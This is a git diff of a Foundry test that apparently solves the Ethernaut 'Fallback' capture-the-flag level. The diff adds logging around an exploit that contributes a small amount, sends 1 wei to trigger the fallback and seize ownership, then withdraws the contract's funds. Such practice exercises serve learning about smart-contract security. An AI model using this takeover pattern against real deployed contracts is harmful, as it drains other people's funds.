@@ -37,16 +37,20 @@ contract TestFallback is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player);
-
+        emit log_named_address("level owner", level.owner());
         // send the minimum amount to become a contributor
         level.contribute{value: 0.0001 ether}();
 
         // send directly to the contract 1 wei, this will allow us to become the new owner
         (bool sent, ) = address(level).call{value: 1}("");
         require(sent, "Failed to send Ether to the level");
-
+        emit log_named_address("level owner", level.owner());
+        emit log_named_uint("user balance", address(player).balance);
+        emit log_named_uint("contract balance", address(level).balance);
         // now that we are the owner of the contract withdraw all the funds
         level.withdraw();
+        emit log_named_uint("user balance", address(player).balance);
+        emit log_named_uint("contract balance", address(level).balance);
 
         vm.stopPrank();
     }
